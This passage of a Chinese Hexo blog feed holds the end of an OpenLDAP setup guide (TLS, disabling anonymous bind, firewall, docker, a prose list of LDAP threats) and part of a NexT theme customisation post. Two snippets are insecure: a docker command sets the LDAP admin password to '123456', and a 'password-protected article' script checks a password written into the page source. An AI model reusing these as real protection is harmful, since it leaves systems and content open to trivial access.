class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi certs.ldif</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">replace</span>: olcTLSCertificateFile</span><br><span class="line"><span class="attribute">olcTLSCertificateFile</span>: /etc/openldap/certs/ldap.cert</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">replace</span>: olcTLSCertificateKeyFile</span><br><span class="line"><span class="attribute">olcTLSCertificateKeyFile</span>: /etc/openldap/certs/ldap.key</span><br><span class="line"></span><br><span class="line"><span class="attribute">ldapmodify -Y EXTERNAL  -H ldapi:/// -f certs.ldif</span></span><br></pre></td></tr></table></figure></p><h2 id="禁止匿名登录"><a href="#禁止匿名登录" class="headerlink" title="禁止匿名登录"></a>禁止匿名登录</h2><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dn</span>: cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">add</span>: olcDisallows</span><br><span class="line"><span class="attribute">olcDisallows</span>: bind_anon</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">add</span>: olcRequires</span><br><span class="line"><span class="attribute">olcRequires</span>: authc</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: olcDatabase=&#123;-1&#125;frontend,cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">add</span>: olcRequires</span><br><span class="line"><span class="attribute">olcRequires</span>: authc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost schema]<span class="comment"># ldapadd -Y EXTERNAL -H ldapi:/// -f disable_anon.ldif</span></span><br><span class="line"><span class="attribute">SASL/EXTERNAL authentication started</span></span><br><span class="line"><span class="attribute">SASL username</span>: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth</span><br><span class="line"><span class="attribute">SASL SSF</span>: 0</span><br><span class="line"><span class="attribute">modifying entry "cn=config"</span></span><br><span class="line"><span class="attribute">modifying entry "cn=config"</span></span><br><span class="line"><span class="attribute">modifying entry "olcDatabase=&#123;-1&#125;frontend,cn=config"</span></span><br></pre></td></tr></table></figure><h2 id="加载用户密码管理"><a href="#加载用户密码管理" class="headerlink" title="加载用户密码管理"></a>加载用户密码管理</h2><p><a href="https://www.jianshu.com/p/ce3bb45585d1" target="_blank" rel="noopener">hahahha</a></p><h2 id="设置防火墙"><a href="#设置防火墙" class="headerlink" title="设置防火墙"></a>设置防火墙</h2><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># firewall-<span class="meta-keyword">cmd</span> --add-service=ldap --permanent   </span></span><br><span class="line"><span class="meta"># firewall-<span class="meta-keyword">cmd</span> --reload</span></span><br></pre></td></tr></table></figure><p>Ps：服务器对外开放，会造成未授权访问，信息泄露</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker </span><span class="string">run </span><span class="built_in">--name</span> <span class="string">ldap_core </span>-p <span class="string">389:389 </span>-p <span class="string">636:636 </span><span class="built_in">--env</span> <span class="string">LDAP_ORGANISATION=</span><span class="string">"manhao6.cn"</span> <span class="built_in">--env</span> <span class="string">LDAP_DOMAIN=</span><span class="string">"manhao6.cn"</span> <span class="built_in">--env</span> <span class="string">LDAP_ADMIN_PASSWORD=</span><span class="string">"123456"</span> <span class="built_in">--detach</span> <span class="string">osixia/</span><span class="string">openldap</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">docker </span><span class="string">run </span><span class="built_in">--name</span> <span class="string">ldap_web </span>-p <span class="string">80:80 </span>-p <span class="string">443:443 </span><span class="built_in">--link</span> <span class="string">ldap_core:ldap_core </span><span class="built_in">--env</span> <span class="string">PHPLDAPADMIN_LDAP_HOSTS=</span><span class="string">ldap_core </span><span class="built_in">--detach</span> <span class="string">osixia/</span><span class="string">phpldapadmi</span></span><br></pre></td></tr></table></figure><h2 id="ldap存在安全问题"><a href="#ldap存在安全问题" class="headerlink" title="ldap存在安全问题"></a>ldap存在安全问题</h2><p>(一)非目录服务的威胁:</p><p>　　1.对LDAP服务器进行网络攻击，包括对服务器的操作系统，公开端口，主机上运行的进程与服务予以攻击来破坏资源的可用性，如利用病毒，worms，木马程序等等进行的攻击;<br>　　2.通过物理访问操作系统，文件和目录或周边设备等等来攻击主机，这种攻击将会影响到资源的可用性，完整性和机密性;<br>　　3.对提供目录服务的后端数据库进行攻击<br>(二)针对目录服务的威胁:<br>　　1.通过数据获取(data-fetching)操作非授权存取数据;<br>　　2.通过监听(monitoring)其他的访问(通道)非授权的存取可再用的客户(身份)证明信息;<br>　　3.通过监听其他的访问(通道)非授权存取数据;<br>　　4.未经授权的数据修改;<br>　　5.未经授权的配置修改;<br>　　6.未经授权的或者过分的资源使用(拒绝服务);<br>　　7.目录的电子欺骗：欺骗客户(client)相信来自一目录服务上的虚假信息，在转接时修改数据或错误指引客户的连接等等。<br>　　LDAP注射(Injection)的概念类似于SQL注射，与SQL注射不同的是它攻击的目标是活动目录(Active Directory)或者任何LDAP服务器。这个思路是恶意用户在LDAP查询中注射不被信任的数据。<br>　　防御方法：对于刺探内部网络的LDAP进行阻断并记录，如果在公共机器上提供LDAP服务，那么应把LDAP服务器放入DMZ。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://myanbin.github.io/post/openldap-in-centos-7.html#fn:1" target="_blank" rel="noopener">CentOS 7 环境下 OpenLDAP 的安装与配置</a><br><a href="https://linuxhostsupport.com/blog/how-to-install-ldap-on-centos-7/" target="_blank" rel="noopener">How to Install LDAP on CentOS 7</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LDAP(Lightweight Directory Access Protocol，轻量级目录访问协议)是用来实现 目录服务 的一种运行于TCP/IP之上的协议。&lt;br&gt;LDAP是指“Lightweight Directory Access Protocol（轻量目录访问协议）”，它是基于X.500协议的，包括了X.500的大部分功能，但是精减掉了那些过于艰深的东西。&lt;br&gt;X.500&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;X.500是OSI标准体系中的目录服务模型，它包含了命名空间的定义以及查询与更新目录的协议，但是X.500在很多场景下被认为有些“用力过猛”。而LDAP，虽然像X.500一样也为目录提供了数据/命名空间的模型与协议，但它被设计为运行在TCP/IP网络协议栈上.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 应用实践" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/"/>
    
      <category term="运维实践" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/%E8%BF%90%E7%BB%B4%E5%AE%9E%E8%B7%B5/"/>
    
    
      <category term="ldap" scheme="blog.manhao6.cn/tags/ldap/"/>
    
      <category term="openLDAP" scheme="blog.manhao6.cn/tags/openLDAP/"/>
    
  </entry>
  
  <entry>
    <title>hexo-next主题美化(持续更新)</title>
    <link href="blog.manhao6.cn/2019/02/10/hexo-next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"/>
    <id>blog.manhao6.cn/2019/02/10/hexo-next主题美化/</id>
    <published>2019-02-10T07:09:42.000Z</published>
    <updated>2019-04-15T09:00:37.663Z</updated>
    
    <content type="html"><![CDATA[<h3 id="主页文章添加阴影效果"><a href="#主页文章添加阴影效果" class="headerlink" title="主页文章添加阴影效果"></a>主页文章添加阴影效果</h3><p>效果图：<br><img src="http://picture.manhao6.cn/20190220135756363/20190220032000951.png" alt><br><a id="more"></a><br>打开\themes\next\source\css_custom\custom.styl向里面加入：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.post</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">  <span class="attribute">-webkit-box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(202, 203, 203, .5);</span><br><span class="line">  <span class="attribute">-moz-box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(202, 203, 204, .5);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><h3 id="文章结尾效果"><a href="#文章结尾效果" class="headerlink" title="文章结尾效果"></a>文章结尾效果</h3><p>在路径 \themes\next\layout_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;</span>-------------　　　　本文结束　<span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-heart"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>　感谢您的阅读　　　　-------------<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>接着打开\themes\next\layout_macro\post.swig文件，在post-body 之后， post-footer 之前添加如下画红色部分代码（post-footer之前两个DIV）<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> 'passage-end-tag.swig' %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>完成后效果：<br><img src="http://picture.manhao6.cn/20190220135756363/20190220024003080.png" alt></p><h3 id="文章加密访问"><a href="#文章加密访问" class="headerlink" title="文章加密访问"></a>文章加密访问</h3><p>打开themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig文件，在以下位置插入这样一段代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    (<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (<span class="string">'&#123;&#123; page.password &#125;&#125;'</span>) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (prompt(<span class="string">'请输入文章密码'</span>) !== <span class="string">'&#123;&#123; page.password &#125;&#125;'</span>) &#123;</span></span><br><span class="line"><span class="actionscript">                alert(<span class="string">'密码错误！'</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (history.length === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="actionscript">                    location.replace(<span class="string">"https://evenyao.com"</span>); <span class="comment">// 这里替换成你的首页</span></span></span><br><span class="line"><span class="actionscript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="undefined">                    history.back();</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后在要加密的文章上添加password属性，后面则是跟想要设置的密码，类似这样：<br><img src="http://picture.manhao6.cn/20190220135756363/20190220024953764.png" alt></p><p>新方法：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> <span class="comment">--save hexo-blog-encrypt</span></span><br></pre></td></tr></table></figure></p><p>在 站点配置文件 中启用该插件<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">encrypt:</span></span><br><span class="line"><span class="attr">    enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    default_abstract:</span> <span class="string">这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。</span></span><br><span class="line"><span class="attr">    default_message:</span> <span class="string">输入密码，查看文章</span></span><br></pre></td></tr></table></figure></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">password:</span> 是该博客加密使用的密码</span><br><span class="line"><span class="symbol">abstract:</span> 是该博客的摘要，会显示在博客的列表页</span><br><span class="line"><span class="symbol">message:</span> 这个是博客查看时，密码输入框上面的描述性文字</span><br></pre></td></tr></table></figure><h3 id="文章版权说明"><a href="#文章版权说明" class="headerlink" title="文章版权说明"></a>文章版权说明</h3><p>在目录 next/layout/_macro/下添加 my-copyright.swig：<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> page.copyright %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"my_post_copyright"</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span></span><br><span class="line"><span class="xml">  <span class="comment">&lt;!-- JS库 sweetalert 可修改路径 --&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/sweetalert/dist/sweetalert.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>本文标题:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; url_for(page.path) &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span><span class="template-variable">&#123;&#123; page.title &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>文章作者:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span> <span class="attr">title</span>=<span class="string">"访问 </span></span></span><span class="template-variable">&#123;&#123; theme.author &#125;&#125;</span><span class="xml"><span class="tag"><span class="string"> 的个人博客"</span>&gt;</span></span><span class="template-variable">&#123;&#123; theme.author &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>发布时间:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="template-variable">&#123;&#123; page.date.format("YYYY年MM月DD日 - HH:mm") &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>最后更新:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="template-variable">&#123;&#123; page.updated.format("YYYY年MM月DD日 - HH:mm") &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>原始链接:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; url_for(page.path) &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">title</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; page.title &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span><span class="template-variable">&#123;&#123; page.permalink &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"copy-path"</span>  <span class="attr">title</span>=<span class="string">"点击复制文章链接"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-clipboard"</span> <span class="attr">data-clipboard-text</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; page.permalink &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>  <span class="attr">aria-label</span>=<span class="string">"复制成功！"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>许可协议:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-creative-commons"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">rel</span>=<span class="string">"license"</span> <span class="attr">href</span>=<span class="string">"https://creativecommons.org/licenses/by-nc-nd/4.0/"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">title</span>=<span class="string">"Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"</span>&gt;</span>署名-非商业性使用-禁止演绎 4.0 国际<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 转载请保留原文链接及作者。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span></span><br><span class="line"><span class="xml">    var clipboard = new Clipboard('.fa-clipboard');</span></span><br><span class="line"><span class="xml">    $(".fa-clipboard").click(function()&#123;</span></span><br><span class="line"><span class="xml">      clipboard.on('success', function()&#123;</span></span><br><span class="line"><span class="xml">        swal(&#123;   </span></span><br><span class="line"><span class="xml">          title: "",   </span></span><br><span class="line"><span class="xml">          text: '复制成功',</span></span><br><span class="line"><span class="xml">          icon: "success", </span></span><br><span class="line"><span class="xml">          showConfirmButton: true</span></span><br><span class="line"><span class="xml">          &#125;);</span></span><br><span class="line"><span class="xml">&#125;);</span></span><br><span class="line"><span class="xml">    &#125;);  </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></p><p>在目录next/source/css/_common/components/post/下添加my-post-copyright.styl<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.my_post_copyright</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">85%</span>;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">45em</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">2.8em</span> auto <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">1.0em</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#d3d3d3</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.93rem</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.6em</span>;</span><br><span class="line">  <span class="attribute">word-break</span>: break-all;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> p&#123;<span class="attribute">margin</span>:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">5.2em</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#b5b5b5</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.raw</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">5em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#808080</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">a</span>:hover &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#a3d2a3</span>;</span><br><span class="line">  <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span>:hover <span class="selector-class">.fa-clipboard</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.post-url</span>:hover &#123;</span><br><span class="line">  <span class="attribute">font-weight</span>: normal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.copy-path</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1em</span>;</span><br><span class="line">  +mobile()&#123;<span class="attribute">display</span>:none;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.copy-path</span>:hover &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#808080</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修改next/layout/_macro/post.swig，在代码<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> 'wechat-subscriber.swig' %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>之前添加增加如下代码：<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> 'my-copyright.swig' %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>如下</p><p><img src="http://picture.manhao6.cn/20190220135756363/20190220031036807.png" alt><br>修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码：<br><figure class="highlight xl"><table><tr><td 